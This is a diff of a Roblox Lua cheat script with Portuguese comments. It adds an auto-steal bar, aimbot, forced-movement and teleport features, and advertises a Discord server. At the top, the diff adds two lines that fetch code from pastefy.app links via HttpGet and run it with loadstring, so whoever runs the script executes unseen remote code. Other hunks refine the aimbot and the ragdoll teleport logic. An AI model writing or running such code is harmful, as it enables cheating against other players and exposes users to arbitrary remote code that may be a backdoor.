@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/cTuNnDnz/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/8clt1HMJ/raw"))()
 loadstring(game:HttpGet("https://pastefy.app/sUr6CJsA/raw"))()
 
 local Players = game:GetService("Players")
@@ -139,9 +141,9 @@ M.hitSoundChoice = "Minecraft Critical Hit"
 M.hitSoundCustomId = ""
 M.hitSoundVolume = 1.0
 M.hitSoundPitch = 1.0
-if isfile and isfile("onihfdhgdf.json") then
+if isfile and isfile("onihubv2auramuitaaura.json") then
 	local ok, data = pcall(function()
-		return HS:JSONDecode(readfile("onihfdhgdf.json"))
+		return HS:JSONDecode(readfile("onihubv2auramuitaaura.json"))
 	end)
 	if ok and type(data) == "table" then
 		if data.introSoundEnabled ~= nil then
@@ -474,7 +476,7 @@ until game:IsLoaded()
 -- ============================================================
 -- THEME SYSTEM & CONFIG SETUP (MONOCHROME BASE + ACCENT HIGHLIGHTS)
 -- ============================================================
-local CHERRY_CONFIG_NAME = "CherryConfig.json"
+local CHERRY_CONFIG_NAME = "onihubv2auramuitaaura.json"
 local CHERRY_THEMES = {
 	Default = { Accent = Color3.fromRGB(168, 85, 247), AccentDim = Color3.fromRGB(130, 60, 200) },
 	Purple = { Accent = Color3.fromRGB(207, 159, 255), AccentDim = Color3.fromRGB(160, 120, 210) },
@@ -3327,103 +3329,194 @@ end
 
 function M.buildMiroAutoStealUI()
     if M.statusGui then pcall(function() M.statusGui:Destroy() end) end
+    if M._autoGrabBillboard then pcall(function() M._autoGrabBillboard:Destroy() end) end
+
     local gui = Instance.new("ScreenGui")
-    gui.Name = "WAVE_AutoGrab"
+    gui.Name = "AutoGrabBarGui"
+    gui.IgnoreGuiInset = true
     gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    local parent = player:FindFirstChildOfClass("PlayerGui")
-    if gethui then pcall(function() parent = gethui() end) end
-    gui.Parent = parent or player:WaitForChild("PlayerGui")
+    gui.DisplayOrder = 9990
+    gui.Parent = player:WaitForChild("PlayerGui")
 
-    local panel = Instance.new("Frame")
-    panel.Name = "AutoGrabPanel"
-    panel.Size = UDim2.fromOffset(280, 50)
-    panel.Position = UDim2.new(0.5, -140, 1, -66)
-    panel.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
-    panel.BorderSizePixel = 0
-    panel.Active = true
-    panel.Parent = gui
-    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 9)
-    local stroke = Instance.new("UIStroke", panel)
-    stroke.Color = Color3.fromRGB(14, 32, 68)
-    stroke.Thickness = 1
-    local scale = Instance.new("UIScale", panel)
-    scale.Scale = M.stealBarScale or 0.3
-    M.stealBarScaleRef = scale
+    -- Texto flutuante exatamente como no arquivo enviado.
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "AutoGrabBillboard"
+    billboard.Size = UDim2.fromOffset(420, 40)
+    billboard.StudsOffset = Vector3.new(0, 3.4, 0)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = 120
+    billboard.LightInfluence = 0
+    billboard.ResetOnSpawn = false
+    local billboardFrame = Instance.new("Frame", billboard)
+    billboardFrame.Name = "BillboardFrame"
+    billboardFrame.Size = UDim2.fromScale(1, 1)
+    billboardFrame.BackgroundTransparency = 1
+    local billboardText = Instance.new("TextLabel", billboardFrame)
+    billboardText.Name = "TextLabel"
+    billboardText.Size = UDim2.fromScale(1, 1)
+    billboardText.BackgroundTransparency = 1
+    billboardText.Text = ".gg/hookduels auto grab"
+    billboardText.TextColor3 = Color3.fromRGB(200, 100, 255)
+    billboardText.TextSize = 22
+    billboardText.Font = Enum.Font.GothamBold
+    billboardText.TextStrokeTransparency = 0
+    billboardText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    local function attachBillboard(char)
+        if not char then return end
+        local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5) or char:FindFirstChild("HumanoidRootPart")
+        if not head then return end
+        for _, child in ipairs(head:GetChildren()) do
+            if child.Name == "AutoGrabBillboard" and child:IsA("BillboardGui") then child:Destroy() end
+        end
+        billboard.Adornee = head
+        billboard.Parent = head
+    end
+    if player.Character then task.spawn(function() task.wait(0.2); attachBillboard(player.Character) end) end
+    if M._autoGrabBillboardConn then pcall(function() M._autoGrabBillboardConn:Disconnect() end) end
+    M._autoGrabBillboardConn = player.CharacterAdded:Connect(function(char)
+        task.wait(0.25)
+        attachBillboard(char)
+    end)
+    if M._autoGrabBillboardConn then
+        pcall(function() M._autoGrabBillboardConn:Disconnect() end)
+        M._autoGrabBillboardConn = nil
+    end
+    pcall(function() billboard:Destroy() end)
+    M._autoGrabBillboard = nil
 
-    local pct = Instance.new("TextLabel", panel)
-    pct.Name = "ProgressPercent"
-    pct.Size = UDim2.fromOffset(44, 16)
-    pct.Position = UDim2.fromOffset(9, 7)
-    pct.BackgroundTransparency = 1
-    pct.Text = "0%"
-    pct.TextColor3 = Color3.fromRGB(255, 255, 255)
-    pct.Font = Enum.Font.GothamBold
-    pct.TextSize = 11
-    pct.TextXAlignment = Enum.TextXAlignment.Left
-    pct.ZIndex = 5
-    M.statusPctLbl = pct
-    M.statusBarPctLbl = pct
-    M.statusStealLbl = nil
+    local container = Instance.new("Frame")
+    container.Name = "Container"
+    container.Active = true
+    container.ClipsDescendants = true
+    container.Position = UDim2.new(0.5, -106, 1, -100)
+    container.Size = UDim2.fromOffset(213, 26)
+    container.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
+    container.BackgroundTransparency = 0.1
+    container.BorderSizePixel = 0
+    container.Parent = gui
+    Instance.new("UICorner", container).CornerRadius = UDim.new(1, 0)
+    local outline = Instance.new("UIStroke", container)
+    outline.Color = Color3.fromRGB(40, 40, 55)
+    outline.Transparency = 0.3
 
-    local radius = Instance.new("TextLabel", panel)
-    radius.Name = "Radius"
-    radius.Size = UDim2.fromOffset(104, 16)
-    radius.Position = UDim2.new(1, -112, 0, 7)
-    radius.BackgroundTransparency = 1
-    radius.Text = string.format("Radius: %.2g", M.getActiveStealRadius())
-    radius.TextColor3 = Color3.fromRGB(255, 255, 255)
-    radius.Font = Enum.Font.GothamBold
-    radius.TextSize = 11
-    radius.TextXAlignment = Enum.TextXAlignment.Right
-    radius.ZIndex = 5
-    M.statusRadiusLbl = radius
-    M.headerRadiusLbl = nil
+    -- Trilha fantasma: permanece visível até o fim da barra.
+    local ghost = Instance.new("Frame", container)
+    ghost.Name = "GhostBar"
+    ghost.Size = UDim2.new(1, -8, 0, 3)
+    ghost.Position = UDim2.new(0, 4, 0.5, -1.5)
+    ghost.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ghost.BackgroundTransparency = 0.94
+    ghost.BorderSizePixel = 0
+    ghost.ZIndex = 1
+    Instance.new("UICorner", ghost).CornerRadius = UDim.new(1, 0)
 
-    local bg = Instance.new("Frame", panel)
-    bg.Name = "ProgressBackground"
-    bg.Size = UDim2.new(1, -18, 0, 11)
-    bg.Position = UDim2.fromOffset(9, 30)
-    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
-    bg.BorderSizePixel = 0
-    bg.ClipsDescendants = true
-    bg.ZIndex = 3
-    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
-    local fill = Instance.new("Frame", bg)
-    fill.Name = "ProgressFill"
+    local fill = Instance.new("Frame", container)
+    fill.Name = "BarFill"
     fill.Size = UDim2.new(0, 0, 1, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(45, 130, 230)
+    fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    fill.BackgroundTransparency = 0.04
     fill.BorderSizePixel = 0
-    fill.ZIndex = 4
+    fill.ZIndex = 2
     Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-    M.statusFill = fill
-    M.statusKnob = nil
-    M.statusShine = nil
-    M.statusFpsLbl = nil
+    local gradient = Instance.new("UIGradient", fill)
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 150, 150)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 0, 0)),
+    })
 
-    local dragging, dragStart, startPos = false, nil, nil
-    panel.InputBegan:Connect(function(input)
-        if M.uiLocked then return end
+    local percent = Instance.new("TextLabel", container)
+    percent.Name = "PercentLabel"
+    percent.ZIndex = 5
+    percent.Size = UDim2.fromScale(1, 1)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percent.TextSize = 11
+    percent.Font = Enum.Font.GothamBold
+    percent.TextStrokeTransparency = 0.4
+
+    local steal = Instance.new("TextLabel", container)
+    steal.Name = "StealLabel"
+    steal.ZIndex = 5
+    steal.Position = UDim2.fromOffset(8, 0)
+    steal.Size = UDim2.fromOffset(70, 26)
+    steal.BackgroundTransparency = 1
+    steal.Text = "STEAL"
+    steal.TextColor3 = Color3.fromRGB(200, 200, 210)
+    steal.TextSize = 9
+    steal.Font = Enum.Font.GothamBold
+    steal.TextXAlignment = Enum.TextXAlignment.Left
+    steal.TextStrokeTransparency = 0.4
+
+    local rangeBox = Instance.new("TextBox", container)
+    rangeBox.Name = "RangeBox"
+    rangeBox.ZIndex = 5
+    rangeBox.Position = UDim2.new(1, -110, 0.5, -8)
+    rangeBox.Size = UDim2.fromOffset(28, 16)
+    rangeBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    rangeBox.BackgroundTransparency = 0.2
+    rangeBox.BorderSizePixel = 0
+    rangeBox.Text = tostring(math.floor((M.Steal and M.Steal.StealRadius) or 80))
+    rangeBox.TextColor3 = Color3.fromRGB(200, 200, 210)
+    rangeBox.TextSize = 9
+    rangeBox.Font = Enum.Font.GothamBold
+    rangeBox.ClearTextOnFocus = false
+    Instance.new("UICorner", rangeBox).CornerRadius = UDim.new(0, 4)
+    rangeBox.FocusLost:Connect(function()
+        local value = tonumber(rangeBox.Text)
+        if value then
+            value = math.clamp(value, 0.5, 300)
+            if M.Steal then M.Steal.StealRadius = value end
+            if M.setStealRadius then M.setStealRadius(value) end
+            rangeBox.Text = tostring(value)
+            if M.updateStatusRadius then M.updateStatusRadius() end
+        end
+    end)
+    local rangeLabel = Instance.new("TextLabel", container)
+    rangeLabel.Name = "RangeLabel"
+    rangeLabel.ZIndex = 5
+    rangeLabel.Position = UDim2.new(1, -138, 0.5, -8)
+    rangeLabel.Size = UDim2.fromOffset(28, 16)
+    rangeLabel.BackgroundTransparency = 1
+    rangeLabel.Text = "R:"
+    rangeLabel.TextColor3 = Color3.fromRGB(160, 160, 175)
+    rangeLabel.TextSize = 9
+    rangeLabel.Font = Enum.Font.GothamBold
+    rangeLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+    -- Esta versão mantém a barra, STEAL e a porcentagem central.
+    pcall(function() rangeBox:Destroy() end)
+    pcall(function() rangeLabel:Destroy() end)
+
+    local dragging, dragStart, frameStart = false, nil, nil
+    container.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = panel.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
+            dragging, dragStart, frameStart = true, input.Position, container.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
         end
     end)
     UIS.InputChanged:Connect(function(input)
         if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
             local d = input.Position - dragStart
-            panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+            container.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + d.X, frameStart.Y.Scale, frameStart.Y.Offset + d.Y)
         end
     end)
 
     M.statusGui = gui
-    M.statusMain = panel
-    M.statusHolder = panel
+    M.statusMain = container
+    M.statusHolder = container
+    M.statusFill = fill
+    M.statusKnob = nil
+    M.statusShine = nil
+    M.statusStealLbl = steal
+    M.statusBarPctLbl = percent
+    M.statusPctLbl = percent
+    M.statusRadiusLbl = nil
+    M.headerRadiusLbl = nil
+    M._referenceAutoGrabStyle = false
+    M._zeyAutoGrabStyle = false
+    M._pasted6AutoGrabStyle = true
 end
 
 function M.updateStealProgress(progress, label)
@@ -3440,9 +3533,13 @@ function M.updateStealProgress(progress, label)
 		else
 			col = UI_ACCENT or Color3.fromRGB(255, 0, 0)
 		end
-		M.statusFill.BackgroundColor3 = col
+		if M._zeyAutoGrabStyle then
+			M.statusFill.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
+		else
+			M.statusFill.BackgroundColor3 = col
+		end
 		local grad = M.statusFill:FindFirstChildOfClass("UIGradient")
-		if grad then
+		if grad and not M._zeyAutoGrabStyle and not M._referenceAutoGrabStyle then
 			local themeAccent = UI_ACCENT or Color3.fromRGB(255, 255, 255)
 			grad.Color = ColorSequence.new({
 				ColorSequenceKeypoint.new(0, themeAccent),
@@ -3454,7 +3551,11 @@ function M.updateStealProgress(progress, label)
 		M.statusKnob.Visible = progress > 0.02
 	end
 	local text
-	if type(label) == "string" and label ~= "" and not tostring(label):match("^%d") then
+	if M._pasted6AutoGrabStyle then
+		text = string.format("%d%%", pct)
+	elseif M._zeyAutoGrabStyle then
+		text = string.format("BRAINROT  %d%%", pct)
+	elseif type(label) == "string" and label ~= "" and not tostring(label):match("^%d") then
 		text = string.format("%d%%", pct)
 	else
 		text = string.format("%d%%", pct)
@@ -3466,7 +3567,11 @@ function M.updateStealProgress(progress, label)
 		M.statusPctLbl.Text = text
 	end
 	if M.statusStealLbl and M.statusStealLbl ~= M.statusBarPctLbl then
-		M.statusStealLbl.Text = text
+		if M._pasted6AutoGrabStyle then
+			M.statusStealLbl.Text = "STEAL"
+		else
+			M.statusStealLbl.Text = text
+		end
 	end
 	if progress > 0.02 and progress < 1 then
 		if not M._stealShineActive and M.statusShine then
@@ -3510,7 +3615,11 @@ end
 
 function M.updateStatusRadius()
 	if M.statusRadiusLbl then
-		M.statusRadiusLbl.Text = "Radius: " .. tostring(M.getActiveStealRadius())
+		if M._pasted6AutoGrabStyle then
+			M.statusRadiusLbl.Text = tostring(math.floor(M.getActiveStealRadius() + 0.5))
+		else
+			M.statusRadiusLbl.Text = "Radius: " .. tostring(M.getActiveStealRadius())
+		end
 	end
 	if M.headerRadiusLbl then
 		M.headerRadiusLbl.Text = tostring(M.getActiveStealRadius())
@@ -5191,12 +5300,20 @@ function M.stopTpAntiDie()
 end
 
 function M.startBatAimbot()
-	local ragdollTP = M.ragdollTPState
-	if ragdollTP and (ragdollTP.LeftEnabled or ragdollTP.RightEnabled) then
-		return
-	end
 	if not M.safeModeTryStart() then
 		return
+	end
+
+	-- O aimbot assume o controle exclusivo da movimentação durante sua execução.
+	-- Guardamos os estados para restaurar Auto Grab e Ragdoll TP ao desligá-lo.
+	M._aimbotSuppressedRagdollTP = nil
+	local ragdollTP = M.ragdollTPState
+	if ragdollTP and (ragdollTP.LeftEnabled or ragdollTP.RightEnabled) then
+		M._aimbotSuppressedRagdollTP = {
+			left = ragdollTP.LeftEnabled == true,
+			right = ragdollTP.RightEnabled == true,
+		}
+		if M.stopRagdollTP then M.stopRagdollTP() end
 	end
 	if M.aimbotConn then
 		pcall(function()
@@ -5377,6 +5494,17 @@ function M.stopBatAimbot()
 	M.autoBatEnabled = false
 	M.autoBatEquippedThisRun = false
 	M.stopTpAntiDie()
+
+	-- Restaura somente o Ragdoll TP pausado pelo aimbot.
+	local savedRagdoll = M._aimbotSuppressedRagdollTP
+	M._aimbotSuppressedRagdollTP = nil
+	if savedRagdoll then
+		if savedRagdoll.left and M.ragdollTPLeft then
+			M.ragdollTPLeft(true)
+		elseif savedRagdoll.right and M.ragdollTPRight then
+			M.ragdollTPRight(true)
+		end
+	end
 
 	-- Se um lado do Ragdoll TP estiver selecionado, rearma sua próxima execução
 	-- assim que o aimbot for desligado.
@@ -14267,11 +14395,45 @@ local function setLinearVelocityXZ(x, z)
             local target = Vector3.new(x, 0, z)
             local delta = target - Vector3.new(current.X, 0, current.Z)
             local mass = math.max(root.AssemblyMass, 1)
-            -- Aceleração alta para alcançar rapidamente NS/CS/Lagger.
-            local force = delta * mass * 100
+            -- No contato, remove somente a componente contra a superfície.
+            -- Assim normal/carry continuam rápidos sem empurrar o personagem para dentro da parte.
+            local targetForForce = target
+            local contactHit = false
+            if delta.Magnitude > 0.05 then
+                local params = RaycastParams.new()
+                params.FilterType = Enum.RaycastFilterType.Exclude
+                params.FilterDescendantsInstances = { char }
+                params.IgnoreWater = true
+                local probe = Vector3.new(delta.X, 0, delta.Z)
+                if probe.Magnitude > 0.05 then
+                    local hit = workspace:Raycast(root.Position, probe.Unit * 1.6, params)
+                    if hit then
+                        contactHit = true
+                        -- Contato real: não empurrar contra a peça e remover velocidade lateral residual.
+                        pcall(function()
+                            _vectorForce.Force = Vector3.zero
+                            root.AssemblyLinearVelocity = Vector3.new(0, current.Y, 0)
+                            root.AssemblyAngularVelocity = Vector3.zero
+                        end)
+                        local normal = Vector3.new(hit.Normal.X, 0, hit.Normal.Z)
+                        if normal.Magnitude > 0.01 then
+                            normal = normal.Unit
+                            local intoSurface = targetForForce:Dot(normal)
+                            if intoSurface < 0 then
+                                targetForForce = targetForForce - normal * intoSurface
+                            end
+                        end
+                    end
+                end
+            end
+            local adjustedDelta = targetForForce - Vector3.new(current.X, 0, current.Z)
+            local force = contactHit and Vector3.zero or (adjustedDelta * mass * 100)
             local maxForce = mass * 5000
             if force.Magnitude > maxForce then force = force.Unit * maxForce end
-            pcall(function() _vectorForce.Force = Vector3.new(force.X, 0, force.Z) end)
+            pcall(function()
+                _vectorForce.Force = Vector3.new(force.X, 0, force.Z)
+                root.AssemblyAngularVelocity = Vector3.zero
+            end)
         end
     end
 end
@@ -14450,7 +14612,20 @@ local RagdollTP = {
     Recovered = true,
 }
 
+local function isServerRagdolled()
+    local char = player.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not hum or hum.Health <= 0 then return false end
+    local state = hum:GetState()
+    return hum.PlatformStand == true
+        or state == Enum.HumanoidStateType.Physics
+        or state == Enum.HumanoidStateType.Ragdoll
+        or state == Enum.HumanoidStateType.FallingDown
+end
+
 local function ragdollTPMove(position)
+    -- A rota só pode ser executada enquanto o servidor mantém o ragdoll real.
+    if not isServerRagdolled() then return false end
     local char = player.Character
     if not char then return end
     pcall(function() char:PivotTo(CFrame.new(position)) end)
@@ -14464,26 +14639,30 @@ local function ragdollTPMove(position)
 end
 
 local function executeRagdollTP(side)
-    if RagdollTP.Teleporting then return end
+    if RagdollTP.Teleporting or not isServerRagdolled() then return end
     RagdollTP.Teleporting = true
     RagdollTP.Recovered = false
     local middle = side == "Left" and RagdollTP.CheckpointBLeft or RagdollTP.CheckpointBRight
     local final = side == "Left" and RagdollTP.FinalLeft or RagdollTP.FinalRight
+    local function move(position)
+        if not isServerRagdolled() then return false end
+        return ragdollTPMove(position)
+    end
 
     -- Primeira passagem: volta pelo caminho, do final até o início.
-    ragdollTPMove(final)
+    if not move(final) then RagdollTP.Teleporting = false; return end
     task.wait(0.12)
-    ragdollTPMove(middle)
+    if not move(middle) then RagdollTP.Teleporting = false; return end
     task.wait(0.12)
-    ragdollTPMove(RagdollTP.CheckpointA)
+    if not move(RagdollTP.CheckpointA) then RagdollTP.Teleporting = false; return end
     task.wait(0.12)
 
     -- Segunda passagem: caminho normal, do início até o final.
-    ragdollTPMove(RagdollTP.CheckpointA)
+    if not move(RagdollTP.CheckpointA) then RagdollTP.Teleporting = false; return end
     task.wait(0.12)
-    ragdollTPMove(middle)
+    if not move(middle) then RagdollTP.Teleporting = false; return end
     task.wait(0.12)
-    ragdollTPMove(final)
+    move(final)
     RagdollTP.Teleporting = false
 end
 
